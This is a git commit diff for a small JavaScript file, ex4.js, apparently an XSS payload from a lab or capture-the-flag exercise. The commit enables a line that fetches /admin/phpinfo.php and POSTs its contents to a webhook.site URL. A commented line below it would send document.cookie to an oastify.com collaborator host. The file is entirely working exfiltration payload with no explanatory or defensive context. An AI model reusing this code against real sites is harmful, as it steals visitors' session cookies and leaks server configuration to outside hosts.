1f6c143ba0fec26384682af8fc6ac905f577a2e7
0xB0xB <37478611+0xB0xB@users.noreply.github.com>
2026-01-14 11:05:08 +0400

    Uncomment fetch call to phpinfo.php

--- ex4.js
+++ ex4.js
@@ -1,3 +1,3 @@
-//fetch('/admin/phpinfo.php').then(r=>r.text()).then(d=>fetch('https://webhook.site/20b80dbe-6c7a-486a-bea5-2e9d4e9d0470',{method:'POST',body:d}))
+fetch('/admin/phpinfo.php').then(r=>r.text()).then(d=>fetch('https://webhook.site/20b80dbe-6c7a-486a-bea5-2e9d4e9d0470',{method:'POST',body:d}))
 
 //fetch('3qutedu6ifxiplg1m57kl2jbv21tpjd8.oastify.com/test='+document.cookie)
